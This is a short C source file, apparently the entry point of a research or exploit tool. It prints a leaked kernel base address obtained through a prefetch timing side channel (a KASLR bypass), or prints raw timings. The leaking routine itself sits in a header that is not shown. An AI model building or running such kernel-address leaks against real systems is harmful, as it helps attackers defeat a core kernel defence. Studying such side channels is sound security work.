#include <stdio.h>
#include "prefetch_leak.h"

typedef enum PREFETCH_OPERATION {
	LeakKernelBase,
	PrintTimings
} PREFETCH_OPERATION;

int main(int argc, char** argv)
{
	PREFETCH_OPERATION op = LeakKernelBase;

	if (argc > 1)
	{
		for (int i = 1; i < argc; i++)
		{
			if (strcmp(argv[i], "--print-timings") == 0 || strcmp(argv[i], "-pt") == 0)
			{
				op = PrintTimings;
			}
		}
	}

	switch (op) {
	case LeakKernelBase:
		printf("Kernel base: %p\n", leak_kernel_base_reliable());
		break;
	case PrintTimings:
		print_timings();
		break;
	}
	
	return 0;
}